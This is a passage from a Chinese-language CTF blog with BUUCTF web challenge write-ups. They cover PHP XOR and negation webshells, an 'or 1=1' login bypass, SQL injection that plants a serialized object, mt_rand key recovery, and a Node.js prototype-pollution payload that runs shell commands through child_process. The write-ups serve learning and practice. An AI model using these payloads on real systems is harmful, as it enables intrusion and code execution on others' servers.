temp)</span><br></pre></td></tr></table></figure>

<p>对结果进行整理一下，发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png" alt="img" style="zoom:67%;">
拿到flag所在文件。最后构造一下，因为flag在最后一个位置，所以可以直接用end进行获取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/22/buu22/">buu22</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-22</time><div class="content"><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>随手试了一下<a target="_blank" rel="noopener" href="http://www.zip==又有源码了,/">www.zip==又有源码了，</a></p>
<p>前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png" alt="img" style="zoom:67%;">

<p>和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1=1’1<br>这里有个大坑，以前没有注意过<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png" alt="img" style="zoom:67%;"></p>
<p>这里要求php的版本是要在5.2.1到7.0.x之间的，不然出来的秘钥是不匹配的</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>计算成功1000次看起来是要写个脚本<br>改天一定要学学算法，感觉自己写的代码都好冗长，可以去世了，测试是可以的，但是由于现在buu限制了，一下子发送太多请求直接500了，服惹<del>弄了时间间隔也没用，so</del>下一题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">r = s.post(url=url).text</span><br><span class="line">r1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">     r=r1</span><br><span class="line">    answer1=re.compile(<span class="string">r&#x27;&lt;br&gt;&lt;br&gt;\d&#123;8&#125;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer2=re.compile(<span class="string">r&#x27;\d&#123;8&#125;&lt;br&gt;&lt;br&gt;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    sign=re.compile(<span class="string">r&#x27; \W &#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer1=float(answer1)</span><br><span class="line">    answer2=float(answer2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> == sign:</span><br><span class="line">        fina_answer=answer1+answer2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fina_answer = answer1-answer2</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>:fina_answer</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url=url, data=data).text</span><br><span class="line">    <span class="comment">#print(r1)</span></span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;bingo!&quot;</span> <span class="keyword">in</span> r1:</span><br><span class="line">        print(i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>做题过程中遇到不熟悉的知识点写在前面比较好</p>
<h3 id="php—foreach理解"><a href="#php—foreach理解" class="headerlink" title="php—foreach理解"></a>php—foreach理解</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $arr is now [2, 4, 6, 8]</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// 最后取消掉引用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">    $v = $v * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$arr=2 4 6</span></span><br></pre></td></tr></table></figure>

<p>原题目有文件泄露所以直接上github下载一下源码<br>然后开始审计~：<br>在helper.php中看到一处序列化，其中这个my_ext是图片的大小，即宽度和高度<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png" alt="img" style="zoom:67%;"></p>
<p>getfile()方法，存在check机制<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png" alt="img" style="zoom:67%;"></p>
<p>严格的白名单检测机制，因为<br><strong>strrchr() 函数</strong><br>（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png" alt="img" style="zoom:67%;"><br>这里有个文件读取，但是path似乎被写死了，暂时还没找到利用点<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png" alt="img" style="zoom:67%;"><br>继续看一下其他文件，在show.php中看到了显示文件的代码，对attr_temp的内容进行反序列化，前面对它是进行了序列化的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png" alt="img" style="zoom:67%;"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目给了反序列化，但是没看到一些有用的跳板，感觉是要结合数据库进行攻击，最后利用file_get_contents得到flag，但是感觉对于那些值可控有点茫然，所以决定传值跟一下<br>首先是数据库配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database pic_base</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png" alt="img" style="zoom:67%;">

<p>可以发现文件名是可控的并且最后是attr参与反序列化，注意到又包含了helper.php，所以感觉是可以进行config值的更改的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png" alt="img" style="zoom:67%;"></p>
<p>所以思路如下：</p>
<p><code>首先构造反序列化对config重新赋值，然后通过sql注入使本来应该title的序列化语句跑到attr字段，然后通过访问该图片，即可获得flag</code><br>构造反序列化语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview=<span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">protected</span> $config=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($a);</span><br></pre></td></tr></table></figure>

<p>然后由于这个是protected<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png" alt="img"></p>
<p>并且题目中对*号做了处理，所以我们对其进行十六进制加密就行了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>

<p>然后构造sql注入语句,抓包改文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&#39;)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;12&#39;,&#39;534b340ce39e1079.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;534b340ce39e1079.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>成功插入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png" alt="img" style="zoom:67%;"><br>获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png" alt="img"></p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>看源码，他除了源码的前五位不检查，其他都会和黑名单比对，但是我们不知道过滤了啥，所以需要fuzz一下,顺便学习一下如何编写文件上传的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_post</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="keyword">for</span> str <span class="keyword">in</span> str_list:</span><br><span class="line">        file_post=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        -----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;屏幕截图(3).png&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12345<span class="subst">&#123;str&#125;</span></span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734--</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r=s.post(url,headers=headers,data=file_post.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_post(url)</span><br></pre></td></tr></table></figure>

<p>经过测试可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了<br>接下里的思路就是思考一下如何构造马去进行上传，如何通过现有字符构造出被过滤的字符，用得一般就是异或操作或者取反，但是异或符号被过滤了，所以这里就用取反去构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__ = [];</span><br><span class="line">$_ = ($__ == $__);<span class="comment">//$_ = 1</span></span><br><span class="line"></span><br><span class="line">$__ = ~(融);</span><br><span class="line">$___ = $__[$_];</span><br><span class="line"><span class="keyword">print</span>($___);<span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>通过以上方法我们可以构造出我们需要的字母，接下来写一个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_split_unicode</span>(<span class="params">$str,$l=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($l&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $ret=<span class="keyword">array</span>();</span><br><span class="line">        $len=mb_strlen($str,<span class="string">&#x27;UTF-8&#x27;</span>);<span class="comment">//mb_strlen获取长度</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i += $l) &#123;</span><br><span class="line">            $ret[] = mb_substr($str, $i, $l, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> preg_split(<span class="string">&quot;//u&quot;</span>, $str, <span class="number">-1</span>, PREG_SPLIT_NO_EMPTY);<span class="comment">//preg_split — 通过一个正则表达式分隔字符串，返回汉字</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">&#x27;放你的汉字要多一点才行&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$arr_str=str_split_unicode($s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($s) ; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $arr_str[$i].<span class="string">&#x27; ------- &#x27;</span>.~$arr_str[$i][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来构造马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">a&#x3D;env</span><br></pre></td></tr></table></figure>

<p>然后访问环境变量就可以看到flag了，为啥是环境变量=-=，好像是题目出了问题，本来在根目录的，</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">GYCTF2020-Ez_Express</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-22</time><div class="content"><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了一下有注册有登录，于是试了一下<a href="http://www.zip发现有源码泄露：">www.zip发现有源码泄露：</a><br>审计的是thinkphp6.0，看半天看不出个所以然，于是看wp了</p>
<h2 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h2><p>原型链特性：<br>当我们调用一个对象的某属性时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对象（obj）中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.proto中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure>

<p>以上机制被称为js的prototype的继承链。和node.js沙盒逃逸的原理似乎是一样的<br><strong>举例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure>

<p><strong>理解：</strong><br>Foo是一个类，prototype是Foo的属性，Foo中所有的实例化后对象都将拥有这个属性，我们在prototype属性中定义了一个方法show，接下来所有实例化后的对象如foo都将直接拥有foo方法。<br><strong>原型链污染定义</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</span><br></pre></td></tr></table></figure>

<p><strong>例：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo=&#123;<span class="attr">bar</span>:<span class="number">1</span>&#125;<span class="comment">//foo是一个对象</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//foo.bar此时为1</span></span><br><span class="line">foo.__proto__.bar=<span class="number">2</span><span class="comment">//foo的原型设一个bar值为2</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)<span class="comment">//输出为1，因为foo的bar已经为1</span></span><br><span class="line"><span class="keyword">let</span> zoo=&#123;&#125;<span class="comment">//设zoo的对象为空</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)<span class="comment">//这个时候zoo的bar就为2，现在每个原型都有个属性bar值为2</span></span><br></pre></td></tr></table></figure>

<h3 id="哪些情况下原型链会被污染？"><a href="#哪些情况下原型链会被污染？" class="headerlink" title="哪些情况下原型链会被污染？"></a>哪些情况下原型链会被污染？</h3><p>在含有能够控制数组（对象）的“键名”的操作即可，一般是以出现：<br>merge和clone对象</p>
<h4 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h4><p>以merge,因为merge执行的就是递归，为例，先构造一个简单的merge函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(source)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) <span class="built_in">Object</span>.assign(source[key], merge(target[key], source[key]))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Join `target` and modified `source`</span></span><br><span class="line">  <span class="built_in">Object</span>.assign(target || &#123;&#125;, source)</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age,gender</span>)</span>&#123;<span class="comment">//构造一个person类</span></span><br><span class="line">	<span class="built_in">this</span>.name=name;</span><br><span class="line">	<span class="built_in">this</span>.age=age;</span><br><span class="line">	<span class="built_in">this</span>.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newperson=<span class="keyword">new</span> Person(<span class="string">&quot;test1&quot;</span>,<span class="number">22</span>,<span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&#x27;</span>);<span class="comment">//新建一个job对象</span></span><br><span class="line">merge(newperson,job);<span class="comment">//这个job对象有用title、contry、__proto__属性，并对其进行赋值</span></span><br><span class="line"><span class="built_in">console</span>.log(newperson);</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype);<span class="comment">//此时per的原型已经被改变为x=1</span></span><br></pre></td></tr></table></figure>

<p>这里解释一下，merge将这几个键值作为一个属性合并到newperson这个对象中了，merge函数执行的其实可以认为是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Person.job.title&#x3D;......</span><br><span class="line">Person.job.__proto__&#x3D;....</span><br></pre></td></tr></table></figure>

<p>这个时候job的原型是Person，所以Person的值就发生了改变。</p>
<h4 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h4><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。通常这些函数类似以下的形式：theFunction(object, path, value)，将对象object的指定路径path上的属性值修改为value。如果攻击者可以控制路径path的值，那么将路径设置为_proto_.theValue，运行theFunction函数之后就有可能将theValue属性注入到object的原型中。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://www.zip下载源码：">www.zip下载源码：</a></p>
<p>然后开始审计</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br></pre></td></tr></table></figure>

<p>在index.js找到merge和clone，接下来看看有哪里调用了他们，发现是在/action这里，并且需要user为admin</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>那么就需要先登录，在登录这列发现</p>
<p>**其中<code> &#39;user&#39;:req.body.userid.toUpperCase()</code> 这一句中<code>toUpperCase()</code>函数是为了将字符串中的小写字符转换成大写，但因为javascript的特性，函数存在分险（下图），所以假如我们传入<code>admın</code>的话，经过<code>toUpperCase()</code>的处理后，会变成<code>ADMIN</code>**关于node-js题目的尝试/9.png)</p>
<blockquote>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以我们可以注册用户名为<code>admın</code>然后进行登录即可，接下来在去可以污染的参数那边看看该如何构造payload<br>首先可以可以看到clone在login那边对body进行操作，那么我们的原型链传入的值也应该在那里</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>再往下看,我们outputoFunctionName被渲染了，那么其实思路就很明确了，通过clone原型链污染outputoFunctionName，导致其值被改变，渲染拿到flag</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>: <span class="string">&quot;test;clearTimeout.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; /app/public/reader&#x27;).toString();var test1&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>从语法的角度解释一下这个payload：我们通过污染outputFunctionName的原型，通过constructor访问其向上原型链，获得主环境的function，2然后通过(‘return process’)()获得主环境process变量，通过process.mainModule.require导入child_process模块，实现命令执行,最后将flag输出至/reader中，由于这个outputFunctionName是未定义的，所以我们后面访问它，就会直接赋值为我们定义的这些属性（和上面的原理是一样的）</p>
